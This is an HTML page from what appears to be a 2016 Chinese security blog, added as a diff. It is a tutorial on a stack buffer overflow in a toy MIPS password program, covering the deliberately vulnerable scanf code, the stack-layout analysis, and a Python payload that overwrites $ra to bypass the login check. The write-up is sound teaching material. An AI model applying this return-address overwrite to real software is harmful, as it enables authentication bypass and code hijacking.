@@ -1,0 +1,97 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 一个简单的mips架构缓冲区溢出分析 · xd_xd's blog</title><meta name="description" content="一个简单的mips架构缓冲区溢出分析 - xd_xd"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.ico"><link rel="stylesheet" href="/css/apollo.css"><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/jquery.goup.js"></script><script src="/js/goup.js"></script><link rel="search" type="application/opensearchdescription+xml" href="http://xdxd.love/atom.xml" title="xd_xd's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/logo.jpg"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/stayliv3" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/archives" target="_self" class="nav-list-link">ARCHIVES</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRIENDS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">一个简单的mips架构缓冲区溢出分析</h1><div class="post-info">Nov 19, 2016</div><div class="post-content"><h1 id="缓冲区溢出原理">缓冲区溢出原理</h1><p>简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)</p>
+<h1 id="简单示例">简单示例</h1><pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="preprocessor">#<span class="keyword">include</span> <span class="string">"string.h"</span></span>
+<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{
+    <span class="keyword">char</span> password[<span class="number">100</span>];
+    <span class="built_in">printf</span>(<span class="string">"\nPlease input your Password: "</span>);
+    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, password);
+    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, <span class="string">"stackoverflow"</span>)) {
+        <span class="built_in">printf</span>(<span class="string">"Welcome to the new world\n"</span>);
+    }<span class="keyword">else</span> {
+        <span class="built_in">printf</span>(<span class="string">"Login failed\nGoodbye!\n"</span>);
+    }
+    <span class="keyword">return</span> <span class="number">0</span>;
+}
+</code></pre><p>编译代码生成可执行文件。</p>
+<pre><code><span class="regexp">/root/</span>buildroot-<span class="number">2016.05</span><span class="regexp">/output/</span>host<span class="regexp">/usr/</span>bin/mipsel-linux-gcc secret.c -o secret -<span class="keyword">static</span>
+</code></pre><p>可以看到这个程序的逻辑比较简单，她要求用户输入一个密码。然后检查密码是否正确，如果正确，就打印欢迎信息，如果错误就返回登录失败的信息。</p>
+<p><img src="/images/simplemips1.png" alt=""></p>
+<p>对于一个正常的应用来说，100个字符的用户名应该足够了。但是如果有人输入了超过100个字符的用户名会有什么情况发生呢。scanf并不会去检查边界，而是盲目的接受所有的字符。</p>
+<p>我们来测试一下输入超过100个字符的密码。</p>
+<p>可以看到程序正常的运行结束之后抛出了一个提示：</p>
+<pre><code>qemu: uncaught <span class="keyword">target</span> signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+</code></pre><p><img src="/images/simplemips2.png" alt=""></p>
+<p>使用qemu结合ida进行动态分析：</p>
+<p>运行程序程序，输入超长的用户名，发现程序运行0x61616161处的指令时发生了崩溃，引发了段故障错误。崩溃现场如图：</p>
+<p><img src="/images/simplemips3.png" alt=""></p>
+<p>可以看到stack view中栈空间充满了61616161，而且寄存器$RA,$FP的值都是61616161，61是我们输入的用户名字母a的16进制编码。所以，超长的字符串劫持了程序的执行流程，让程序执行到了0x61616161这个我们可控的地址继续执行，而这个地址使我们随意输入的，从而导致了程序崩溃。</p>
+<h1 id="栈空间布局分析">栈空间布局分析</h1><p>因为我们有程序的源码，而且程序比较简单。所以直接阅读汇编代码也比较清晰，只有一个判断分支。</p>
+<p><img src="/images/simplemips4.png" alt=""></p>
+<h1 id="参考资料">参考资料</h1><p>栈操作：MIPS32架构与X86架构一样，都是向低地址增长的。但在MIPS32架构中没有EBP(栈底指针)，进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的stack frame的存储区域。此后，栈指针便不在移动，只能在函数返回时将栈指针加上这个偏移量回复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量。</p>
+<p>返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。（注1）</p>
+<pre><code>addiu   <span class="label">$sp</span>, -0x88
+<span class="keyword">sw</span>      <span class="label">$ra</span>, 0x88+var_4(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$fp</span>, 0x88+var_8(<span class="label">$sp</span>)
+<span class="keyword">move</span>    <span class="label">$fp</span>, <span class="label">$sp</span>
+<span class="keyword">li</span>      <span class="label">$gp</span>, 0x4A6670
+<span class="keyword">sw</span>      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$sp</span>)
+lui     <span class="label">$v0</span>, 0x47  # '<span class="keyword">G</span>'
+addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aPleaseInputYou - 0x470000)  # <span class="string">"\nPlease input your Password: "</span>
+<span class="keyword">la</span>      <span class="label">$v0</span>, printf
+<span class="keyword">move</span>    <span class="label">$t9</span>, <span class="label">$v0</span>
+jalr    <span class="label">$t9</span> ; printf
+nop
+lw      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$fp</span>)
+lui     <span class="label">$v0</span>, 0x47  # '<span class="keyword">G</span>'
+addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aS_2 - 0x470000)  # <span class="string">"%s"</span>
+addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
+<span class="keyword">move</span>    <span class="label">$a1</span>, <span class="label">$v0</span>
+<span class="keyword">la</span>      <span class="label">$v0</span>, __isoc99_scanf
+<span class="keyword">move</span>    <span class="label">$t9</span>, <span class="label">$v0</span>
+jalr    <span class="label">$t9</span> ; __isoc99_scanf
+nop
+lw      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$fp</span>)
+addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
+<span class="keyword">move</span>    <span class="label">$a0</span>, <span class="label">$v0</span>
+
+addiu   <span class="label">$sp</span>, -0x88
+<span class="keyword">sw</span>      <span class="label">$ra</span>, 0x88+var_4(<span class="label">$sp</span>)
+<span class="keyword">sw</span>      <span class="label">$fp</span>, 0x88+var_8(<span class="label">$sp</span>)
+</code></pre><p>分配栈空间大小为0x88，然后将$ra,$fp保存在堆栈中。</p>
+<pre><code>addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aS_2 - 0x470000)  # <span class="string">"%s"</span>
+addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
+<span class="keyword">move</span>    <span class="label">$a1</span>, <span class="label">$v0</span>
+<span class="keyword">la</span>      <span class="label">$v0</span>, __isoc99_scanf
+</code></pre><p>scanf的参数a1为sp+0x18，可以计算出栈空间的分布。</p>
+<p><img src="/images/simplemips5.png" alt=""></p>
+<p>password分配了102个字节的空间，后面是上一个函数的栈指针和保存的$ra返回地址，让当前函数结束运行之后，CPU会从$ra处开始执行命令，而基础器$ra的值是从栈空间里保存的$ra处恢复的。（图片画错了，应该是$FP）</p>
+<p>当password长度为112个字节的时候，可以覆盖返回RA，从而控制返回地址。</p>
+<p><img src="/images/simplemips6.png" alt=""></p>
+<p>通过动态运行进行观察，输入数据为112个字节。</p>
+<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb
+</code></pre><p><img src="/images/simplemips7.png" alt=""></p>
+<p>返回地址覆盖成了61616262，然后程序会从0x61616262处开始执行，这会导致不可预料的后果，大部分情况都会导致内存访问违规。从而程序崩溃，抛出了段错误。</p>
+<h1 id="漏洞利用">漏洞利用</h1><p>既然我们可以控制程序从一个指定的地址开始执行命令，那么如果我们知道一个以前没有权限执行的危险命令的地址，就可以通过溢出的方式欺骗程序去执行这个命令。在这个例子中我们可以尝试在没有成功登陆的情况下执行成功登陆之后的一些指令。</p>
+<p>这里我们尝试用登录成功之后执行指令的地址覆盖$RA,从而在我们没有正确的密码的情况下获得需要输入密码才可以获得的信息。</p>
+<pre><code>.<span class="keyword">text</span>:<span class="number">00400878</span>                 lui     <span class="variable">$v0</span>, <span class="number">0x47</span>  # <span class="string">'G'</span>
+.<span class="keyword">text</span>:<span class="number">0040087</span>C                 addiu   <span class="variable">$a0</span>, <span class="variable">$v0</span>, (aWelcomeToTheNe - <span class="number">0x470000</span>)  # <span class="string">"Welcome to the new world"</span>
+.<span class="keyword">text</span>:<span class="number">00400880</span>                 la      <span class="variable">$v0</span>, puts
+.<span class="keyword">text</span>:<span class="number">00400884</span>                 <span class="keyword">move</span>    <span class="variable">$t9</span>, <span class="variable">$v0</span>
+.<span class="keyword">text</span>:<span class="number">00400888</span>                 jalr    <span class="variable">$t9</span> ; puts
+.<span class="keyword">text</span>:<span class="number">0040088</span>C                 nop
+.<span class="keyword">text</span>:<span class="number">00400890</span>                 lw      <span class="variable">$gp</span>, <span class="number">0x88</span>+var_78(<span class="variable">$fp</span>)
+.<span class="keyword">text</span>:<span class="number">00400894</span>                 j       loc_4008B8
+.<span class="keyword">text</span>:<span class="number">00400898</span>                 nop
+</code></pre><p>输入正确的密码之后，会跳转到0x00400878处执行。通过前面的分析，已经知道需要112个字节来覆盖$RA。写一个小脚本来生成我们需要的payload</p>
+<pre><code>import struct
+shellcode = <span class="string">"a"</span>*<span class="number">108</span>
+shellcode += struct.<span class="function"><span class="title">pack</span><span class="params">(<span class="string">"&gt;L"</span>,<span class="number">0</span>x00400878)</span></span>
+fw = <span class="function"><span class="title">open</span><span class="params">(<span class="string">'shellcode'</span>,<span class="string">'w'</span>)</span></span>
+fw.<span class="function"><span class="title">write</span><span class="params">(shellcode)</span></span>
+fw.<span class="function"><span class="title">close</span><span class="params">()</span></span>
+print ‘ok<span class="string">'</span>
+</code></pre><p>可以看到程序成功输出了 ‘welcome to the new world’。</p>
+<p><img src="/images/simplemips8.png" alt=""></p>
+<h1 id="参考资料-1">参考资料</h1><p>注1 :引用自&lt;&lt;解密家用路由器oday漏洞挖掘技术&gt;&gt;<br><a href="https://werewblog.wordpress.com/2015/11/23/a-simple-buffer-overflow-exploit-mips-architecture/" target="_blank" rel="external">A simple buffer overflow exploit (MIPS architecture)</a></p>
+</div></article></div></section><footer><div class="paginator"><a href="/2016/10/19/discuz最新版20160601-SSRF漏洞分析/" class="next">下一篇</a></div><div class="copyright"><p>© 2016 <a href="http://xdxd.love">xd_xd</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/hkalexling/Yuno-Apollo" target="_blank">Yuno-Apollo</a>.</p></div></footer></div><script src="https://cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
